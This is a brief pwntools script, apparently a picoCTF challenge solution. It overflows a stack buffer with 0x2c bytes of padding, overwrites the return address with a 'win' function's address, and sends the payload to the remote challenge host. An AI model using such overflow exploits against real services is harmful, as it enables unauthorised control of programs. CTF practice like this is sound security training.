from pwn import *

elf = context.binary = ELF("./vuln")
pay = b"A"*0x2c+p64(elf.sym.win)
# p = process("./vuln")
p = remote("dolphin-cove.picoctf.net",53214)
p.sendline(pay)
p.interactive()
